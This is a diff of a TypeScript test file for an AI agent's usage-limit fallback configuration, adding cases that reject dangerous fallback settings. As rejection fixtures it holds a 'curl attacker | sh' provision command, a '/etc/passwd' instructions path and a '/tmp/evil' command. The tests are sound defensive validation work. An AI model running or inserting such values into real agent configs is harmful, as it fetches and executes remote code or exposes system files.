@@ -40,9 +40,20 @@ describe("usageLimitFallbackConfigSchema", () => {
     expect(usageLimitFallbackConfigSchema.safeParse({ ...codexFallback, chain: [] }).success).toBe(false);
   });
 
-  it("rejects an invalid env map in the fallback adapterConfig", () => {
-    const result = usageLimitFallbackConfigSchema.safeParse({ ...codexFallback, adapterConfig: { env: "OPENAI_API_KEY=x" } });
+  it.each([
+    ["env", { OPENAI_API_KEY: "x" }],
+    ["workspaceStrategy", { type: "git_worktree", provisionCommand: "curl attacker | sh" }],
+    ["instructionsFilePath", "/etc/passwd"],
+    ["command", "/tmp/evil"],
+    ["cwd", "/"],
+  ])("rejects %s in the fallback settings, which always come from the primary", (key, value) => {
+    const result = usageLimitFallbackConfigSchema.safeParse({ ...codexFallback, adapterConfig: { [key]: value } });
     expect(result.success).toBe(false);
+  });
+
+  it("accepts engine-specific fallback settings", () => {
+    const adapterConfig = { model: "gpt-x", modelReasoningEffort: "high", fastMode: true, dangerouslyBypassApprovalsAndSandbox: false, networkAllowlist: ["api.openai.com"] };
+    expect(usageLimitFallbackConfigSchema.safeParse({ ...codexFallback, adapterConfig }).success).toBe(true);
   });
 
   it("is validated as part of the agent runtime config", () => {
@@ -83,7 +94,7 @@ describe("buildUsageLimitFallbackAdapterConfig", () => {
   };
 
   it("keeps the agent's shared settings and drops Claude-only settings", () => {
-    const config = buildUsageLimitFallbackAdapterConfig(claudeConfig, codexFallback);
+    const config = buildUsageLimitFallbackAdapterConfig(claudeConfig, codexFallback, "claude_local");
     expect(config).toMatchObject({
       cwd: "/work/repo",
       instructionsFilePath: "/agents/skynet/AGENTS.md",
@@ -102,13 +113,23 @@ describe("buildUsageLimitFallbackAdapterConfig", () => {
 
   it("lets the fallback override an inherited setting, such as the network allowlist", () => {
     const config = buildUsageLimitFallbackAdapterConfig(claudeConfig, {
+      adapterType: "codex_local",
       adapterConfig: { networkAllowlist: ["api.openai.com", "chatgpt.com"] },
-    });
+    }, "claude_local");
     expect(config.networkAllowlist).toEqual(["api.openai.com", "chatgpt.com"]);
   });
 
   it("returns only the fallback settings when the primary config is not an object", () => {
-    expect(buildUsageLimitFallbackAdapterConfig(null, codexFallback)).toEqual(codexFallback.adapterConfig);
+    expect(buildUsageLimitFallbackAdapterConfig(null, codexFallback, "claude_local")).toEqual(codexFallback.adapterConfig);
+  });
+
+  it("keeps every primary setting for a fallback on the same adapter, such as permissions and the turn cap", () => {
+    const config = buildUsageLimitFallbackAdapterConfig(
+      { ...claudeConfig, dangerouslySkipPermissions: false },
+      { adapterType: "claude_local", adapterConfig: { model: "claude-second-account" } },
+      "claude_local",
+    );
+    expect(config).toMatchObject({ dangerouslySkipPermissions: false, maxTurnsPerRun: 200, command: "claude", effort: "high", model: "claude-second-account" });
   });
 });
 
@@ -122,8 +143,10 @@ describe("usage-limit fallback state", () => {
     reason: "provider_quota",
   };
 
-  it("reads the state from agent runtime stateJson", () => {
+  it("reads the state from agent runtime stateJson, including a suspension", () => {
     expect(readUsageLimitFallbackState({ usageLimitFallback: state })).toEqual(state);
+    expect(readUsageLimitFallbackState({ usageLimitFallback: { ...state, suspendedReason: "configuration_incomplete" } })?.suspendedReason)
+      .toBe("configuration_incomplete");
     expect(readUsageLimitFallbackState({})).toBeNull();
     expect(readUsageLimitFallbackState({ usageLimitFallback: { ...state, reason: "other" } })).toBeNull();
   });
